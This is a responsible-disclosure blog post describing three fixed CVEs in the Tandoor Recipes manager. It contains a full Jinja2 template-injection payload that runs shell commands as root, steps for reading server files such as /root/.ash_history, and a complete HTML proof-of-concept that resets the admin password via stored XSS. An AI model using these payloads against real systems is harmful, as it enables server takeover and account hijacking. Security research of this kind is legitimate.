---
title: All Your Recipe Are Belong to Us (Part 2/3) - Server-Side Template Injection (RCE), Arbitrary File Read and Unrestricted File Upload (Stored XSS) in Tandoor Recipes
date: 2025-01-28T04:00:56+01:00
toc: false
images: 
tags:
  - CVE
  - Web
  - English
---

I used 4 hours of my free time (not counting the Responsible Disclosure and Blog Posts...) to "speed pentest" the three biggest and most popular (measured by Github stars) open-source recipe managers. 

This included [Tandoor Recipes](https://github.com/TandoorRecipes/recipes), which had >5800 stars at the time of testing. Here I found 3 vulnerabilities. The first one is a _Server-Side Template Injection_, through which it was possible to execute commands on the server (Remote Code Execution). The second one is an _arbitrary file read_ vulnerability, that allows one to read any files from the server. This can be used to obtain various secrets, such as passwords, SSH keys or the Django secret key. The last one is an _Unrestricted File Upload_, through which it was possible to upload any files. This included HTML and SVG files to achieve _Stored XSS_.

## Overview of the Vulnerabilities
| CVE | Name                                                                               | CVSS Score      |
| ----- | ---------------------------------------------------------------------------------- | ------ |
| [CVE-2025-23211](https://www.cve.org/CVERecord?id=CVE-2025-23211) | Jinja2 Server-Side Template Injection leading to Remote Code Execution | [9.9 Critical](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| [CVE-2025-23212](https://www.cve.org/CVERecord?id=CVE-2025-23212) | Arbitrary File Read: Users can read the content of arbitrary files on the server                                          | [7.7 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) |
| [CVE-2025-23213](https://www.cve.org/CVERecord?id=CVE-2025-23213) | Unrestricted File Upload: Users can upload HTML or SVG files to exploit Stored XSS          | [8.7 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) |

## Remediation

The maintainer reacted quickly and professionally. All three vulnerabilities are fixed in Tandoor Recipes version 1.5.28.

## Vulnerabilities in Detail

### [CVE-2025-23211] Jinja2 Server-Side Template Injection leading to Remote Code Execution (9.9 Critical)

Users can create recipes and specify instructions for a recipe. The instructions support Jinja2 Template Expression in order to dynamically update e.g. ingredient names and amounts. As this is implemented insecurely, it is possible to achieve Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE).

![Tandoor1](/media/2025/01/tandoor1.png)

The payload `{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('whoami',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}` executes the command `whoami` on the server.

![Tandoor2](/media/2025/01/tandoor2.png)

As we can see, we can execute commands as the root user!

![Tandoor3](/media/2025/01/tandoor3.png)

Reading the environment variables, we can enumerate the Postgres password as well as the `SECRET_KEY` used by django.

But why is the SSTI payload so long and cryptic?
Getting to the point of achieving RCE wasn't as simple as taking a Hacktricks/PayloadAllTheThings payload and pasting it, but took some time.
This is gonna be a long one, but it's worth it. Trust me.

While this is an open-source project and we could simply look at it's code to see that it is using Jinja2 as template engine, I want to approach it from a black box perspective.

To detect the template injection and to identify the template engine, we gonna use the [Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table/index.html) that I've created during my master's thesis (I know, shameless plug...). 

First, we'll use the universal polyglot `<%'${{/#{@}}%>{{` which throws an error for all 44 template engines I've analyzed.

![Tandoor4](/media/2025/01/tandoor4.png)

As we can see, an error is thrown. Unfortunately for us, the error was caught and only a generic error message is displayed. Otherwise Jinja2 would have revealed itself already. So we need to continue identifying the template engine. Since we can see the output of the template engine, we can use the 'Toggle Error-Based Polyglots' button to hide the error-based polyglots, as the non-error-based ones are more efficient for identifying a template engine.

![Tandoor5](/media/2025/01/tandoor5.png)

We are goint to use the first three universal non-error-based polyglots in order to filter out possible template engines. E.g. when using the first one `p ">[[${{1}}]]` we receive the output `p ">[[$1]]`

![Tandoor6](/media/2025/01/tandoor6.png)

Just with these three polyglots, we were able to filter out 34 template engines, leaving us with 10 left

![Tandoor7](/media/2025/01/tandoor7.png)

Using the specific non-error-based polyglots `{#${{1}}#}}`, `<%=1%>#{2}{{a}}` and `{{1in[1]}}` leaves only Jinja2 as possible template engine!

![Tandoor8](/media/2025/01/tandoor8.png)

To exploit the SSTI, we need to create a gadget chain. As a first step for that, we need to be able to access global objects and to recover the `<class 'object'>`. 

However, using the examples from hacktricks, such as `[].__class__` will result in an error.

So let's check (remember, from a black box perspective) what is happening here. When we use `{{ "{{ [].__class__ }}" }}` in order to let Jinja2 to just print `{{ [].__class__ }}` as a string, we see that `__` is being converted to `<strong>`. 

![Tandoor9](/media/2025/01/tandoor9.png)

That's because markdown is allowed as input and being converted to html! This renders a few needed special characters useless.
Among others, we cannot use `_`, `*`, `` ` ``, `[]()`.

However, there is still a way to achieve RCE (as you already know :)):

We can use hexencoded underscores (`\x5f`) if we use Jinja2's `attr` filter.
So instead of `{{ [].__class__ }}` we are using `{{ []|attr('\x5f\x5fclass\x5f\x5f') }}`

![Tandoor10](/media/2025/01/tandoor10.png)

We succesfully accessed the global list object! 


The next step is now to recover `<class 'object'>` with `{{ []|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f') }}`

![Tandoor12](/media/2025/01/tandoor12.png)

Done! That's ez, right? However, when we try to recover all subclasses we receive an error!

![Tandoor13](/media/2025/01/tandoor13.png)

Otherwise, we would have seen a list of all available subclasses. Nonetheless, we can enumerate specific subclasses with `getitem({SUBCLASS_ID})`. Let's do that with the first subclass unsing `{{ []|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(0) }}`

![Tandoor14](/media/2025/01/tandoor14.png)

The `type` subclass is not that exciting, right? But what's exciting is the `subprocess.Popen` subclass, because it allows us to run arbitrary commands on the server! However, there are hundreds if not thousands of subclasses available.

![Tandoor15](/media/2025/01/tandoor15.png)

So let's bruteforce the right id.

![Tandoor16](/media/2025/01/tandoor16.png)

We can see that `subprocess.Popen` has the id 418!

![Tandoor17](/media/2025/01/tandoor17.png)

Now we can use that to create our final payload which we can use to run arbitrary commands on the server: `{{[]|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('whoami',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}`

(The `|attr('decode')('utf-8')` pipe makes sure that the output is properly formatted, so that not everything is embedded between `'` and `'>`...)

### [CVE-2025-23212] Arbitrary Fileread: Users can read the content of arbitrary files on the server (7.7 High)
Every user has access to "External Recipes", where they can manage storage folder locations.

![Tandoor18](/media/2025/01/tandoor18.png)

So let's configure an _external storage_.

![Tandoor19](/media/2025/01/tandoor19.png)

We can create a new _Storage Backend_.

![Tandoor20](/media/2025/01/tandoor20.png)

Here we choose _Local_ as Method and specify an arbitrary name, e.g. _Insecure_

![Tandoor21](/media/2025/01/tandoor21.png)

Now, back at the _External Recipes_ page, we can specify can choose the just created local storage and specify a path.

![Tandoor22](/media/2025/01/tandoor22.png)

If we specfiy a path which does not exist on the server and try to sync the folder, we receive a `FileNotFoundError`

![Tandoor23](/media/2025/01/tandoor23.png)

Now let's specify `/root` as path and sync again

![Tandoor24](/media/2025/01/tandoor24.png)

We can see the filenames of all files the root directory contains! If it is a pdf file, we can view it in the frontend after importing it as a recipe.

![Tandoor25](/media/2025/01/tandoor25.png)

Files which are not PDF files, won't get shown by the frontend. However, we can use the API endpoint `GET /api/get_recipe_file/{ID}/` in order to receive the contents. 

![Tandoor26](/media/2025/01/tandoor26.png)

In this case, we can see the content of the `/root/.ash_history` file, which contains the commands the root user ran.

### [CVE-2025-23213] Unrestricted File Upload: Users can upload HTML or SVG files to exploit Stored XSS (8.7 High)

Tandoor has a file upload functionality that every user is allowed to use.
Here is a Proof-of-Concept (PoC) HTML file which can be uploaded in order to change the password of the admin user, if they view it.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automated Request</title>
</head>
<body>
    <h1 id="status">Loading...</h1>
    <script>
        // Function to perform the GET request to fetch the CSRF token
        async function fetchCsrfToken() {
            try {
                const response = await fetch('/admin/auth/user/1/password/', {
                    method: 'GET',
                    credentials: 'include' // Include cookies for authentication
                });
                const text = await response.text();

                // Check if the response contains the "not authorized" message
                if (text.includes('not authorized to access this page')) {
                    throw new Error('not authorized');
                }

                // Extract the CSRF token from the response using a regular expression
                const csrfTokenMatch = text.match(/<input type="hidden" name="csrfmiddlewaretoken" value="(.*?)">/);
                
                if (csrfTokenMatch && csrfTokenMatch[1]) {
                    return csrfTokenMatch[1]; // Return the extracted CSRF token
                } else {
                    throw new Error('CSRF token not found');
                }
            } catch (error) {
                throw error; // Propagate the error to handle it in the main function
            }
        }

        // Function to perform the POST request to update the password
        async function changePassword(csrfToken) {
            const formData = new URLSearchParams();
            formData.append('csrfmiddlewaretoken', csrfToken);
            formData.append('username', 'admin');
            formData.append('password1', 'NewPassword123');
            formData.append('password2', 'NewPassword123');

            try {
                const response = await fetch('/admin/auth/user/1/password/', {
                    method: 'POST',
                    credentials: 'include', // Include cookies for authentication
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: formData.toString()
                });

                if (response.ok) {
                    return true; // Password update was successful
                } else {
                    throw new Error('Failed to update password');
                }
            } catch (error) {
                throw new Error('Error changing password: ' + error.message);
            }
        }

        // Main function to execute both requests sequentially
        (async function execute() {
            try {
                // Step 1: Fetch the CSRF token
                const csrfToken = await fetchCsrfToken();

                // Step 2: Use the CSRF token to update the password
                const result = await changePassword(csrfToken);

                // Update the page status based on the result
                if (result) {
                    document.getElementById('status').textContent = 'Password updated successfully!';
                }
            } catch (error) {
                // Check if the error is due to "not authorized"
                if (error.message === 'not authorized') {
                    document.getElementById('status').textContent = 'You are not an admin. Send this link to an admin user.';
                } else {
                    // Display other error messages on the page
                    document.getElementById('status').textContent = 'Error: ' + error.message;
                }
            }
        })();
    </script>
</body>
</html>
```

The File Upload feature has no restrictions on the files that can be uploaded. 

![Tandoor27](/media/2025/01/tandoor27.png)

However, the filenames are changed to a random UUIDv4 and the filename is not disclosed immediately. To know the filename of our uploaded file we need to specify the file as `Custom Theme` or as `Logo`

![Tandoor28](/media/2025/01/tandoor28.png)

This way, it is referenced in HTML responses returned by tandoor, revealing its path.

![Tandoor29](/media/2025/01/tandoor29.png)

The PoC, if visited, checks whether the user has administrative privileges or not.

![Tandoor30](/media/2025/01/tandoor30.png)

If the user has administrative privileges, the password of the admin user is changed to `NewPassword123`

![Tandoor31](/media/2025/01/tandoor31.png)

Now we can login as the administrator.

![Tandoor32](/media/2025/01/tandoor32.png)

## Timeline
| Date | Event |
| - | - |
| 2024-11-25 | Discovered the vulnerabilities |
| 2024-11-26 | Reported the vulnerabilites |
| 2024-11-26 | Maintainer acknowledged the vulnerabilities thankfully |
| 2024-11-26 | Maintainer fixed the critical SSTI vulnerability in version 1.5.24 |
| 2024-11-26 | Provided further input on possible countermeasures |
| 2025-01-17 | Reminded the maintainer about the remaining two vulnerabilities |
| 2025-01-17 | Maintainer fixed the remaining two vulnerabilitites in version 1.5.28 |
| 2025-01-17 | Maintainer requested CVEs through GitHub Security Advisories |
| 2025-01-20 | CVEs were reserved |
| 2025-01-28 | Security Advisories were published |
